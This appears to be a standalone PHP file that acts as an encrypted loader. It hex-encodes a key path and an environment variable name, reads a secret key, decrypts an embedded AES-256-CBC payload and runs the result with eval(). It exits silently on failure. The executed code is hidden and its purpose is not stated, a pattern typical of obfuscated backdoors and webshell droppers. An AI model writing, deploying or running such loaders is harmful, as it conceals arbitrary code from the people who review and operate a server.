<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UFKV/cEGoItEPszhEJcmKg==');

$c=base64_decode(

'f+7LB2bmXRDDpFI9/nTa/Y/ujItXAZawFygtlYwWPVFJMXdNc1Agks6bebxabL+Mrh623jwfBcDT' .
'rnTji393s4idQPMrn5RFgDADqL11uXH+nURxQKauDLDbUy+Ymdv+0fnsxLz8CcUaEyqS/vuNiqXr' .
'WWwRvUevhmCKOh5bQoz1YcBZxN2Oe8bdH1DVa5SMaQ/b0o6nvbPYkLHYCCiU0Z+OO2+zftSVPoy5' .
'9ELQUfeLNY3XDd2wBCC5b6ra6m3eI7iTu86tM2TiEcv9JqKwYi11A9Z3QtK4KEO3ITbCh01xvAvg' .
'3Q9WTAmeYuD02zBkcA7fntnI4H4J+xBfl8YAe+uoXgYI6r8pqFh46bQ6U8ACMsYcGYRm95ApK0lE' .
'bW36yVpffVYXEtd9W22iT++hLRg0Ob371ddWJht89ebVj5rvYdJ5o0O5KWHmBs9fRLQlVXweH7Ba' .
'dzdCjYqJxpavPBP4wmCigHv6SkWNxkjs3SZsYUCzlOX6sIiBLDYM/H2iMfyl5Aljdefpy8Yex4RH' .
'4ehC/lGPDBBUrXrBigMR2cgfJ13oDhElSuxlKxxU1F1j20p4tUmS1VHG4IgBSQ6dZpI51qN2oPc6' .
'8HboAju3ysHbDsrUnaySR+kiqbm3/04j/WotRv09i+6bHotRD+OwV2KxjvcKJSvrBICYUzrfWJU4' .
'jTdGfE+KgWB20JoSovg/uhXwtodTPhxMd16zF8FCoA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

